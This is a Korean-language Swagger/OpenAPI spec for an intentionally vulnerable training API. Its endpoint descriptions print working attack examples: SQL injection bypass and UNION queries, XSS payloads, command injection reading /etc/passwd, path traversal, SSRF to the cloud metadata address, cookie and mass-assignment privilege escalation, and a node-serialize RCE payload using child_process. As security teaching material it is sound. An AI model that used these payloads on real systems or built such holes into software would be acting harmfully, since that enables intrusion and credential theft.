const swaggerDocument = {
  openapi: '3.0.0',
  info: {
    title: '보안 취약점 학습 API',
    version: '1.0.0',
    description: '⚠️ 교육 목적의 보안 취약점 학습용 API입니다. 실제 프로덕션 환경에서는 사용하지 마세요!',
  },
  servers: [
    {
      url: 'http://localhost:3000/api',
      description: '개발 서버',
    },
  ],
  tags: [
    { name: 'Users', description: '일반 사용자 API' },
    { name: 'Games', description: '게임 API' },
    { name: 'Vulnerabilities - SQL Injection', description: '⚠️ SQL Injection 취약점' },
    { name: 'Vulnerabilities - XSS', description: '⚠️ Cross-Site Scripting 취약점' },
    { name: 'Vulnerabilities - Command Injection', description: '⚠️ 명령어 주입 취약점' },
    { name: 'Vulnerabilities - Path Traversal', description: '⚠️ 경로 탐색 취약점' },
    { name: 'Vulnerabilities - IDOR', description: '⚠️ 권한 없는 객체 접근' },
    { name: 'Vulnerabilities - Weak Auth', description: '⚠️ 약한 인증' },
    { name: 'Vulnerabilities - Data Exposure', description: '⚠️ 민감한 정보 노출' },
    { name: 'Vulnerabilities - SSRF', description: '⚠️ 서버 측 요청 위조' },
    { name: 'Vulnerabilities - Mass Assignment', description: '⚠️ 대량 할당 취약점' },
    { name: 'Vulnerabilities - Insecure Deserialization', description: '⚠️ 안전하지 않은 역직렬화' },
  ],
  paths: {
    '/users': {
      get: {
        summary: '모든 유저 조회',
        description: '시스템의 모든 유저를 조회합니다',
        tags: ['Users'],
        responses: {
          '200': {
            description: '성공',
          },
        },
      },
    },
    '/games': {
      get: {
        summary: '모든 게임 조회',
        tags: ['Games'],
        responses: {
          '200': {
            description: '성공',
          },
        },
      },
    },
    '/vulnerable/login': {
      post: {
        summary: '[취약점] SQL Injection - 로그인',
        description: '⚠️ SQL Injection 취약점이 있는 로그인 엔드포인트\n\n**공격 예제:**\n- username: `admin\' OR \'1\'=\'1`\n- password: `anything`',
        tags: ['Vulnerabilities - SQL Injection'],
        requestBody: {
          required: true,
          content: {
            'application/json': {
              schema: {
                type: 'object',
                properties: {
                  username: {
                    type: 'string',
                    example: "admin' OR '1'='1",
                  },
                  password: {
                    type: 'string',
                    example: "anything",
                  },
                },
              },
            },
          },
        },
        responses: {
          '200': {
            description: '응답',
          },
        },
      },
    },
    '/vulnerable/search': {
      get: {
        summary: '[취약점] SQL Injection - 사용자 검색',
        description: '⚠️ SQL Injection 취약점이 있는 검색 엔드포인트\n\n**공격 예제:**\n- `\' UNION SELECT id, password, secret_token FROM users--`',
        tags: ['Vulnerabilities - SQL Injection'],
        parameters: [
          {
            name: 'query',
            in: 'query',
            required: true,
            schema: {
              type: 'string',
              example: "' UNION SELECT id, password, secret_token FROM users--",
            },
          },
        ],
        responses: {
          '200': {
            description: '검색 결과',
          },
        },
      },
    },
    '/vulnerable/comment': {
      get: {
        summary: '[취약점] XSS - 댓글 표시',
        description: '⚠️ XSS (Cross-Site Scripting) 취약점\n\n**공격 예제:**\n- `<script>alert(\'XSS\')</script>`\n- `<img src=x onerror="alert(\'XSS\')">',
        tags: ['Vulnerabilities - XSS'],
        parameters: [
          {
            name: 'text',
            in: 'query',
            required: true,
            schema: {
              type: 'string',
              example: "<script>alert('XSS')</script>",
            },
          },
        ],
        responses: {
          '200': {
            description: 'HTML 응답',
          },
        },
      },
    },
    '/vulnerable/ping': {
      get: {
        summary: '[취약점] Command Injection - Ping',
        description: '⚠️ Command Injection 취약점\n\n**공격 예제:**\n- `127.0.0.1; ls`\n- `127.0.0.1 && whoami`\n- `127.0.0.1 | cat /etc/passwd`',
        tags: ['Vulnerabilities - Command Injection'],
        parameters: [
          {
            name: 'host',
            in: 'query',
            required: true,
            schema: {
              type: 'string',
              example: '127.0.0.1; ls',
            },
          },
        ],
        responses: {
          '200': {
            description: '명령 실행 결과',
          },
        },
      },
    },
    '/vulnerable/file': {
      get: {
        summary: '[취약점] Path Traversal - 파일 읽기',
        description: '⚠️ Path Traversal 취약점\n\n**공격 예제:**\n- `../server.js`\n- `../../package.json`\n- `../../../etc/passwd`',
        tags: ['Vulnerabilities - Path Traversal'],
        parameters: [
          {
            name: 'filename',
            in: 'query',
            required: true,
            schema: {
              type: 'string',
              example: '../server.js',
            },
          },
        ],
        responses: {
          '200': {
            description: '파일 내용',
          },
        },
      },
    },
    '/vulnerable/user/{id}': {
      get: {
        summary: '[취약점] IDOR - 사용자 정보 조회',
        description: '⚠️ IDOR (Insecure Direct Object Reference) 취약점\n\n권한 검증 없이 모든 사용자의 비밀번호와 토큰을 조회할 수 있습니다.',
        tags: ['Vulnerabilities - IDOR'],
        parameters: [
          {
            name: 'id',
            in: 'path',
            required: true,
            schema: {
              type: 'integer',
              example: 1,
            },
            description: '사용자 ID (1, 2, 3, 4)',
          },
        ],
        responses: {
          '200': {
            description: '사용자 정보 (비밀번호 포함)',
          },
        },
      },
    },
    '/vulnerable/auth/login': {
      post: {
        summary: '[취약점] 약한 인증 - 로그인',
        description: '⚠️ Weak Authentication - 쿠키 조작 가능\n\n비밀번호 없이 로그인하고, 쿠키를 조작하여 권한을 상승시킬 수 있습니다.',
        tags: ['Vulnerabilities - Weak Auth'],
        requestBody: {
          required: true,
          content: {
            'application/json': {
              schema: {
                type: 'object',
                properties: {
                  username: {
                    type: 'string',
                    example: 'user1',
                  },
                },
              },
            },
          },
        },
        responses: {
          '200': {
            description: '로그인 성공 (쿠키 설정됨)',
          },
        },
      },
    },
    '/vulnerable/auth/profile': {
      get: {
        summary: '[취약점] 약한 인증 - 프로필 조회',
        description: '⚠️ 쿠키를 조작하여 권한 상승 가능\n\n브라우저 개발자 도구에서 `role=admin`으로 쿠키를 변경해보세요.',
        tags: ['Vulnerabilities - Weak Auth'],
        responses: {
          '200': {
            description: '프로필 정보',
          },
          '401': {
            description: '로그인 필요',
          },
        },
      },
    },
    '/vulnerable/debug': {
      get: {
        summary: '[취약점] 민감한 정보 노출',
        description: '⚠️ Sensitive Data Exposure - DB 비밀번호, API 키 노출\n\n프로덕션 환경 정보가 그대로 노출됩니다.',
        tags: ['Vulnerabilities - Data Exposure'],
        responses: {
          '200': {
            description: '민감한 시스템 정보',
          },
        },
      },
    },
    '/vulnerable/proxy': {
      get: {
        summary: '[취약점] SSRF - 프록시',
        description: '⚠️ SSRF (Server-Side Request Forgery)\n\n**공격 예제:**\n- `http://localhost:3000/api/vulnerable/debug`\n- `http://169.254.169.254/latest/meta-data/` (AWS 메타데이터)',
        tags: ['Vulnerabilities - SSRF'],
        parameters: [
          {
            name: 'url',
            in: 'query',
            required: true,
            schema: {
              type: 'string',
              example: 'http://localhost:3000/api/vulnerable/debug',
            },
          },
        ],
        responses: {
          '200': {
            description: '프록시된 응답',
          },
        },
      },
    },
    '/vulnerable/update-profile': {
      put: {
        summary: '[취약점] Mass Assignment',
        description: '⚠️ Mass Assignment - 모든 필드 수정 가능\n\n**공격 예제:**\n```json\n{\n  "role": "admin",\n  "secret_token": "my_hacked_token"\n}\n```',
        tags: ['Vulnerabilities - Mass Assignment'],
        parameters: [
          {
            name: 'userId',
            in: 'query',
            schema: {
              type: 'integer',
              example: 1,
            },
            description: '수정할 사용자 ID',
          },
        ],
        requestBody: {
          required: true,
          content: {
            'application/json': {
              schema: {
                type: 'object',
                example: {
                  role: 'admin',
                  secret_token: 'my_token',
                },
              },
            },
          },
        },
        responses: {
          '200': {
            description: '업데이트 성공',
          },
        },
      },
    },
    '/vulnerable/deserialize': {
      post: {
        summary: '[취약점] Insecure Deserialization - 데이터 역직렬화',
        description: '⚠️ Insecure Deserialization - 원격 코드 실행(RCE) 가능\n\n`node-serialize` 라이브러리를 사용하여 데이터를 역직렬화할 때, 조작된 페이로드를 통해 서버에서 임의의 코드를 실행할 수 있습니다.\n\n**공격 예제 (서버에 `/tmp/pwned` 파일 생성):**\n```json\n{\n  "data": "{\\"username\\":\\"pwned\\",\\"_is_serialized\\":true,\\"payload\\":\\"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'touch /tmp/pwned\')}()\\"}"\n}\n```',
        tags: ['Vulnerabilities - Insecure Deserialization'],
        requestBody: {
          required: true,
          content: {
            'application/json': {
              schema: {
                type: 'object',
                properties: {
                  data: {
                    type: 'string',
                    example: '{"username":"test"}',
                  },
                },
              },
            },
          },
        },
        responses: {
          '200': {
            description: '역직렬화 성공',
          },
          '400': {
            description: '잘못된 요청',
          },
        },
      },
    },
  },
};


module.exports = swaggerDocument;
